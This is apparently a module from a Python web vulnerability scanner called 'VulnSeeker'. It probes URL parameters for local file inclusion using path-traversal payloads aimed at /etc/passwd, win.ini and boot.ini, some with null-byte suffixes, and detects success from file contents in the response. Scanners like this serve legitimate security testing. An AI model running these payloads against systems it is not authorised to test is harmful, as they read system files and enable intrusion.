import logging
import re
import urllib.parse
from typing import List

import requests

from core.models import ScannerModule, Target, Vulnerability, Severity

logger = logging.getLogger("VulnSeeker")
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


class LFIScanner(ScannerModule):
    @property
    def name(self) -> str:
        return "Local File Inclusion (LFI)"

    @property
    def description(self) -> str:
        return "Detecta inclusión de archivos locales (etc/passwd, win.ini, boot.ini)."

    def run(self, target: Target) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        payloads = [
            "../../../../etc/passwd",
            "/etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../etc/passwd%00",
            "/etc/passwd%00",
            "../../../../windows/win.ini%00",
            "../../../../boot.ini%00",
        ]
        common_params = ["page", "file", "doc", "view", "include", "content"]

        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        targets_to_test = []

        req_headers = {"User-Agent": UA_BROWSER}
        if target.headers:
            req_headers.update(target.headers)

        # Obtener baseline para descartar falsos positivos pre-existentes
        baseline_text = ""
        try:
            resp_base = requests.get(target.url, timeout=6, headers=req_headers, verify=False, allow_redirects=True)
            baseline_text = resp_base.text or ""
        except Exception:
            pass

        if params:
            for key in params:
                for payload in payloads:
                    new_params = params.copy()
                    new_params[key] = payload
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    new_url = parsed._replace(query=new_query).geturl()
                    targets_to_test.append((new_url, key, payload))
        else:
            base = target.url.rstrip("/")
            for p in common_params:
                for payload in payloads:
                    new_url = f"{base}/?{p}={urllib.parse.quote(payload, safe='/%')}"
                    targets_to_test.append((new_url, p, payload))

        for test_url, param_name, payload in targets_to_test:
            try:
                logger.info(f"📂 LFI Scanner: probando {test_url}")
                resp = requests.get(test_url, timeout=6, headers=req_headers, verify=False, allow_redirects=True)
                body = resp.text or ""
                
                # Comprobar indicadores ignorando coincidencias pre-existentes en el baseline
                has_lfi = False
                if re.search(r"root:x:0:0:", body, re.IGNORECASE) and not re.search(r"root:x:0:0:", baseline_text, re.IGNORECASE):
                    has_lfi = True
                elif re.search(r"\[(extensions|fonts)\]", body, re.IGNORECASE) and not re.search(r"\[(extensions|fonts)\]", baseline_text, re.IGNORECASE):
                    has_lfi = True
                    
                if has_lfi:
                    evidence = body[:50].replace("\n", " ").replace("\r", " ")
                    vulns.append(Vulnerability(
                        name="Local File Inclusion (LFI)",
                        description=f"Parámetro vulnerable: {param_name}",
                        severity=Severity.CRITICAL,
                        target_url=test_url,
                        payload=payload + f" | evidencia: {evidence}"
                    ))
                    break
            except Exception as e:
                logger.debug(f"LFI Scanner error en {test_url}: {e}")
                continue

        return vulns
